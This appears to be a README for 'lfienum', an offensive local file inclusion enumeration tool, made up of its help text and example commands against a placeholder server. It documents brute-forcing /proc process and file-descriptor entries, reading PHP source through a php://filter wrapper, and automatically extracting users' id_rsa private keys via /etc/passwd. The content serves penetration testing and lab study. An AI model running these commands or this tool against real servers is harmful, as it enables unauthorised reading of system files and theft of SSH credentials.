Local File Inclusion Enumeration (PoC)  

Almost whole system enumeration when target is vulnerable to LFI.  

```zsh
Local File Inclusion Enumerator v1.0 by 0bfxgh0st*
Usage python3 lfienum <url> <option>

Options:

    --pids <n>           Bruteforce from 0 to <n> process id
    --pid  <n>           Single process id
    --fd   <n>           Bruteforce /proc/self/fd/X from 0 to <n> (default is set to 30)
    --wrapper            (php://filter/convert.base64-encode/resource=)
    -w or --wordlist     Use a custom wordlist
    -k or --key          Extract id_rsa key

Last positional argument:

    -vvv                 Verbose show package stats
    --only-url           Dump urls only

Examples:

    python3 lfienum "http://ghost.server/index.php?page="
    python3 lfienum "http://ghost.server/index.php?page=" --pids 999
    python3 lfienum "http://ghost.server/index.php?page=" --pid 1
    python3 lfienum "http://ghost.server/index.php?page=" --fd
    python3 lfienum "http://ghost.server/index.php?page=" --wrapper index.php
    python3 lfienum "http://ghost.server/index.php?page=" --wordlist wordlist.txt
    python3 lfienum "http://ghost.server/index.php?page=" --key
```
Auto id_rsa key extraction from /etc/passwd, check `def IdRSA():` function
